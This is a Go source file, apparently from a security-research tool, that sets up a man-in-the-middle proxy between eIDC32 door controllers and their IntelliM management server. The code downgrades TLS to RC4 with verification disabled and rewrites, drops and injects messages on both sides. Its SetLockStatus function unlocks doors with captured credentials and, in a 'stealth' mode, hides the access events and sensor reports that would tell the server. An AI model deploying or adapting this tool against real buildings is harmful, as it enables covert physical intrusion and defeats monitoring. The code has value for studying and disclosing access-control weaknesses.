package eidc32proxy

import (
	"bufio"
	"errors"
	"fmt"
	"github.com/chrismarget/terribletls"
	"net"
	"net/url"
	"regexp"
	"sync"
	"time"
)

// LoginInfo contains details from an eIDC32's initial connection to a
// server. We save this separate from a Message structure because the
// contents are needed to build the outbound half of the proxy connection
// and this step happens before any eid32proxy.Message processing.
type LoginInfo struct {
	Host         string
	ServerKey    string
	ConnectedReq ConnectedRequest
}

// UsernameAndPassword can hold credentials for the IntelliM API, web API,
// FTP user, etc...
type UsernameAndPassword struct {
	username string
	password string
}

// CxnDetail holds the address/port tuples associated with a TCP connection
type CxnDetail struct {
	Client string
	Server string
}

// Mitm holds two CxnDetail members, one for each side of a proxied
// (man-in-the-middle'd) connection from eIDC32 to IntelliM
type Mitm struct {
	ClientSide CxnDetail
	ServerSide CxnDetail
}

// newSession handles an eIDC32 client connection (net.Conn), connects it to
// the intended server. 'msgChan' is used to expose proxied http messages
// between the eIDC32 and its server.
func newSession(eidcCxn net.Conn) (*Session, error) {
	// divine the eIDC32's intended server by peeking into
	// the incoming socket data
	eidcRdr := bufio.NewReader(eidcCxn)
	loginInfo, err := peekLoginInfo(eidcRdr)
	if err != nil {
		return nil, err
	}

	// Make the server half of the session
	// todo: it'd be nice if we had the client's TLS parameters,
	//  could emulate them when connecting to the server.
	serverCxn, err := ConnectUsingTerribleTLS(loginInfo.Host)
	if err != nil {
		return nil, err
	}
	serverRdr := bufio.NewReader(serverCxn)
	session := Session{
		StartTime: time.Now(),
		over:      &sync.WaitGroup{},
		LoginInfo: *loginInfo,
		Mitm: Mitm{
			ClientSide: CxnDetail{
				Client: eidcCxn.RemoteAddr().String(),
				Server: eidcCxn.LocalAddr().String(),
			},
			ServerSide: CxnDetail{
				Client: serverCxn.LocalAddr().String(),
				Server: serverCxn.RemoteAddr().String(),
			},
		},
		errSubMap:    make(map[chan error]struct{}),
		errSubMutex:  &sync.Mutex{},
		manglers:     make(map[int]Mangler),
		mangleLock:   &sync.Mutex{},
		sm:           &seqMangler{log: true},
		relayMutex:   &sync.Mutex{},
		injectChan:   make(map[Direction]chan *Message),
		serverKeys:   []string{loginInfo.ServerKey},
		intelliMhost: loginInfo.Host,
		pointStatus:  make(map[int]Point),
		Pager:        NewMessagePager(),
	}

	// lock the message relays. This gives us the opportunity to interrupt/mangle
	// even the earliest messages in a newly-created session.
	session.relayMutex.Lock()

	// Initialize the waitGroup that indicates when the session has ended
	session.over.Add(1)

	// Start error distribution. Each error sent on errDistChan
	// gets relayed to all subscribers (like the display)
	errDistChan := make(chan error)
	go session.distribureErr(errDistChan)

	// Start routines that handle this session's northbound and southbound messages.
	// Each set of routines reads from both the supplied input reader and from the
	// returned inject channel. Relayed messages go through manglers, impersonation
	// routines, and sequencing fixup.
	session.injectChan[Northbound] = session.relayMsg(Northbound, eidcRdr, serverCxn, errDistChan)
	session.injectChan[Southbound] = session.relayMsg(Southbound, serverRdr, eidcCxn, errDistChan)

	return &session, nil
}

// Inject sends a message within the session. It also installs any manglers
// needed along with the injected message. The idea here is that if you're
// sending a message that provokes a response, you'd want to include with it a
// mangler that intercepts the responses so that side "A" doesn't see responses
// from "B" for messages that "A" never sent.
func (o Session) Inject(msg Message, manglers []Mangler) {
	localMsg := msg
	localMsg.Injected = true
	o.relayMutex.Lock()
	for _, m := range manglers {
		o.AddMangler(m)
	}
	o.injectChan[localMsg.Direction()] <- &localMsg
	o.relayMutex.Unlock()
}

// ConnFuncForURL returns a function that, when executed, initiates
// a connection to the host specified in target given the URL's protocol
// scheme and the specified transport type. Possible transport types can be
// found in the net.Dial() documentation.
//
// This helper function abstracts the selection of 'net.Dial()',
// 'terribletls.Dial()', and other potential connection functions.
func ConnFuncForURL(target *url.URL, transportType string) func() (net.Conn, error) {
	if target.Scheme == "https" {
		return func() (net.Conn, error) {
			return ConnectUsingTerribleTLSByNetwork(target.Host, transportType)
		}
	}

	return func() (net.Conn, error) {
		return net.Dial(transportType, target.Host)
	}
}

// ConnectUsingTerribleTLS makes a 'terribletls' TLS connection via TCPv4
// to the specified host.
//
// See ConnectUsingTerribleTLSByNetwork() for details.
func ConnectUsingTerribleTLS(dest string) (*terribletls.Conn, error) {
	return ConnectUsingTerribleTLSByNetwork(dest, network)
}

// ConnectUsingTerribleTLSByNetwork makes a connection to the specified host
// using 'terribletls' via the specified network transport type. Possible
// transport types can be found in the net.Dial() documentation.
//
// The 'terribletls' library is a hacked together copy of Go's standard
// 'crypto/tls' library. It includes support for deprecated ciphers used by
// Infinias software.
func ConnectUsingTerribleTLSByNetwork(dest string, transportType string) (*terribletls.Conn, error) {
	//keylog, err := keyLogWriter()
	//if err != nil {
	//	return nil, err
	//}
	conf := &terribletls.Config{
		//KeyLogWriter: keylog,
		InsecureSkipVerify: true,
		CipherSuites: []uint16{
			terribletls.TLS_RSA_WITH_RC4_40_MD5,
			terribletls.TLS_RSA_WITH_RC4_128_MD5,
		},
	}

	return terribletls.Dial(transportType, canonicalizeHost(dest), conf)
}

// canonicalizeHost adds ":443" where necessary
func canonicalizeHost(in string) string {
	re := regexp.MustCompile(":[0-9]+$")
	if re.MatchString(in) {
		return in
	}
	return in + ":443"
}

func scannerToSliceByteChan(s *bufio.Scanner) chan []byte {
	c := make(chan []byte)
	go func() {
		for s.Scan() {
			c <- s.Bytes()
		}
	}()
	return c
}

// relayInboundHalf reads incoming messages (probably from the network socket),
// applies manglers, and, on deciding not to drop the message, sends the message
// (pointer) on xmitChan for sending by another function.
func (o *Session) relayInboundHalf(dir Direction, in *bufio.Reader, errChan chan error, xmitChan chan *Message) {
	// set up scanner to read from the inbound socket
	s := bufio.NewScanner(in)
	s.Split(SplitHttpMsg)
	buf := make([]byte, 1<<10)
	s.Buffer(buf, 1<<20)

	// Get a channel to tell us if the session's died
	itsOver := o.tellMeWhenItsOver()
	var msgBytes []byte

	// Get a channel of scanner results
	scannerChan := scannerToSliceByteChan(s)

MESSAGE:
	// Loop forever (the only ways out are end of session or scanner error)
	for {
		select {
		case <-itsOver: // Somebody killed the session by calling Done() on the waitgroup
			return
		case msgBytes = <-scannerChan: // The inbound scanner.Scan() returned
			err := s.Err() // Check for scanner for errors
			if err != nil {
				errChan <- err         // Distribute the error.
				o.EndTime = time.Now() // Mark the session end time.
				o.over.Done()          // Announce the session's demise.
				return                 // End this loop.
			}
		}

		// lock the relay mutex
		o.relayMutex.Lock()
		// parse the message into a *Message
		msg, err := ReadMsg(msgBytes, dir)
		if err != nil {
			errChan <- err
			o.relayMutex.Unlock()
			continue
		}

		// I'm not sure where the "update session data" functions should be
		// called: before manglers? after manglers? inbound relay half?
		// outbound half? I'm putting it here for now.
		err = o.updateSessionData(msg)
		if err != nil {
			errChan <- err
		}

		// run all the manglers (or Drop)
		o.mangleLock.Lock()
		for i, m := range o.manglers {
			mr, err := m.Mangle(msg)
			if err != nil || mr&ManglerErr == ManglerErr {
				if err == nil {
					err = errors.New("unspecified finalMangler error (this should never happen)")
				}
				errChan <- err
			}
			if mr&ManglerDone == ManglerDone {
				delete(o.manglers, i)
			}
			if mr&ManglerDrop == ManglerDrop {
				msg.Dropped = true
				o.mangleLock.Unlock()
				o.relayMutex.Unlock()
				o.Pager.DistributeMessage(msg)
				continue MESSAGE
			}
		}
		o.mangleLock.Unlock()
		xmitChan <- msg
		o.relayMutex.Unlock()
	}
}

// relayOutboundHalf reads message pointers from xmitChan, applies the command
// sequencer, renders the message to bytes, applies impersonation rules and
// then writes the result to the outbound network socket. Messages handled
// by this function ordinarily come from relayInboundHalf, but can also be
// injected into the channel by the session's Inject() method.
func (o Session) relayOutboundHalf(dir Direction, out net.Conn, errChan chan error, xmitChan chan *Message) {
	// Get a channel to tell us if the session's died
	itsOver := o.tellMeWhenItsOver()

	// loop forever (until itsOver closes) reading messages from xmitChan
	for {
		var msg *Message
		select {
		case <-itsOver:
			return
		case msg = <-xmitChan:
		}
		// any message that survived the mangle loops now needs its sequence
		// numbers normalized. This is a special "always runs" mangler for
		// southbound messages.
		if dir == Southbound && msg.Request != nil {
			mr, err := o.sm.Mangle(msg)
			if mr&ManglerErr == ManglerErr || err != nil {
				if err == nil {
					err = errors.New("unspecified sequence mangler error")
				}
				errChan <- err
			}
		}

		o.Pager.DistributeMessage(msg)

		// render the message to bytes
		payload, err := msg.Marshal()
		if err != nil {
			errChan <- errors.New("error marshaling message; passing message unmodified:" + err.Error())
			// something went terribly wrong. Spit out the original message with no changes.
			payload = msg.origBytes
		}

		// run the impersonation features to get misspellings, etc...
		impostor, err := impersonate(payload, dir)
		if err != nil {
			errChan <- errors.New("error running impersonate; passing message unmodified:" + err.Error())
			impostor = payload
		}

		// write the message to the socket
		_, err = out.Write(impostor)
		if err != nil {
			errChan <- err         // Distribute the error.
			o.EndTime = time.Now() // Mark the session end time.
			o.over.Done()          // Announce the session's demise.
			return                 // End this loop.
		}
	}
}

// A Session represents a single proxied connection between an eIDC32 and an
// IntelliM server.
type Session struct {
	Mitm                Mitm                        // TCP details of both sides
	StartTime           time.Time                   // StartTime
	EndTime             time.Time                   // EndTime
	over                *sync.WaitGroup             // Session over
	LoginInfo           LoginInfo                   // Detail from initial eIDC message
	manglers            map[int]Mangler             // All messages run through these manglers
	mangleLock          *sync.Mutex                 // Don't run pass messages during mangler add/remove intervals
	errSubMap           map[chan error]struct{}     // Error subscriber channels
	errSubMutex         *sync.Mutex                 // Don't send errors during subscriber add/remove intervals
	sm                  Mangler                     // Mandatory mangler fixes sequence numbers
	relayMutex          *sync.Mutex                 // Used to pause relaying while messages are in flight
	injectChan          map[Direction]chan *Message // Inject fake messages on these Northbound/Southbound channels
	serverKeys          []string
	intelliMhost        string
	apiCreds            UsernameAndPassword
	webCreds            UsernameAndPassword
	getOutboundResponse GetOutboundResponse
	eventsEnabled       bool
	timeSet             bool
	pointStatus         map[int]Point
	heartbeats          uint32
	Pager               MessagePager
}

// relayMsg starts two background functions for relaying messages in a single
// direction. One function handles incoming messages either from eIDC
// (northbound) or from intelli-M (southbound). The other function handles
// outgoing messages (northbound to intelli-M or southbound to eIDC). Messages
// are relayed from the first function to the second via a *Message channel. The
// same channel is returned by this function for use by message injectors.
func (o *Session) relayMsg(dir Direction, in *bufio.Reader, out net.Conn, errChan chan error) chan *Message {

	// xmitChan is where the input/read function talks to the output/write function.
	// xmitChan is also returned by this function for use by message inject logic.
	// all messages send on this channel get send to the downstream service (either
	// the eidc32 or the intelli-M service, depending on direction)
	xmitChan := make(chan *Message)

	// start the read+mangle function (the inbound half of the relay)
	go o.relayInboundHalf(dir, in, errChan, xmitChan)

	// start the resequence+impersonation+write function (the outbound half of the relay)
	go o.relayOutboundHalf(dir, out, errChan, xmitChan)

	// xmitChan is also the message injection channel. We return it here so that
	// other threads may inject messages into the session.
	return xmitChan
}

// AddMangler adds a message mangler object to the session,
// returns the mangler's ID number.
func (o *Session) AddMangler(m Mangler) int {
	o.mangleLock.Lock()
	// figure out highest mangler number
	highest := -1
	for key := range o.manglers {
		if key > highest {
			highest = key
		}
	}
	id := highest + 1
	o.manglers[id] = m
	o.mangleLock.Unlock()
	return id
}

// DelMangler deletes a mangler (by ID) from the session
func (o *Session) DelMangler(mangler int) {
	o.mangleLock.Lock()
	delete(o.manglers, mangler)
	o.mangleLock.Unlock()
}

// distribureErr fires a copy of each error to every subscriber
func (o Session) distribureErr(errChan chan error) {
	// Loop over session errors channels
	for err := range errChan {
		// Lock the error subscriber list (no new subscribers allowed while distributing errors)
		o.errSubMutex.Lock()
		for ch := range o.errSubMap {
			timeOut := time.NewTimer(100 * time.Millisecond)
			select {
			case ch <- err: // write to the subscriber's channel (buffered 1) if possible
			case <-timeOut.C: // subscriber had 100ms, never showed up.
				timeOut.Stop()
			}
		}
		o.errSubMutex.Unlock()
	}
}

// UpTime returns the time since a session started
func (o Session) UpTime() time.Duration {
	return time.Since(o.StartTime)
}

// SubscribeErr returns a channel on which the subscriber can listen for session errors
func (o *Session) SubscribeErr() chan error {
	out := make(chan error, 1)
	o.errSubMutex.Lock()
	o.errSubMap[out] = struct{}{}
	o.errSubMutex.Unlock()
	return out
}

// UnSubscribeErr removes the channel from the session's map
func (o *Session) UnSubscribeErr(c chan error) {
	o.errSubMutex.Lock()
	delete(o.errSubMap, c)
	o.errSubMutex.Unlock()
	close(c)
}

// BeginRelaying unlocks the session relays, starting message flow in the
// session relays. The session starts with relays locked, requiring an explicit
// unlock via this function. This scheme gives time setting up message manglers
// before the first messages are relayed from eIDC32 to IntelliM.
func (o Session) BeginRelaying() {
	o.relayMutex.Unlock()
}

// SetLockStatus POSTs to eidc/door/lockstatus at the eIDC32 and intercepts the
// eIDC32 WebServer's 200OK response.
// Additionally, if stealth is true, it:
// 1) Intercepts the eIDC32's AccessGranted event this action provokes.
// 2) POSTs to /eidc/eventack on behalf of the server to acknowledge the event.
// 3) Intercepts the eIDC32 WebServer's 200OK response.
func (o Session) SetLockStatus(status lockstatus, stealth bool) error {
	setLockStatusMsg, err := NewLockStatusMsg(o.apiCreds.username, o.apiCreds.password, status)
	if err != nil {
		return err
	}
	dropLockStatusReply := dropEidcResponse{msgType: MsgTypeDoor0x2fLockStatusResponse}

	manglers := []Mangler{dropLockStatusReply}

	if stealth {
		var suppress EventType
		switch status {
		case Locked: suppress = EventAccessRestricted
		case Unlocked: suppress = EventAccessGranted
		}
		manglers = append(manglers,DropEidcEvent{EventType: suppress, Session: &o, OneShot: true})
		manglers = append(manglers,DropEidcPointStatusRequest{point: 12})
		manglers = append(manglers,DropEidcPointStatusRequest{point: 38})
		manglers = append(manglers,DropEidcPointStatusRequest{point: 16})
	}

	go o.Inject(*setLockStatusMsg, manglers)

	return nil
}

// tellMeWhenItsOver returns a channel. The channel will close when the
// session has died.
func (o Session) tellMeWhenItsOver() chan struct{} {
	done := make(chan struct{})
	go func() {
		o.over.Wait()
		close(done)
	}()
	return done
}

func (o LoginInfo) String() string {
	return fmt.Sprintf(""+ // <- empty string stops GoFmt making a mess of the lines below
		"Host: %s\n"+
		"ServerKey: %s\n"+
		o.ConnectedReq.String(),
		o.Host,
		o.ServerKey,
	)
}
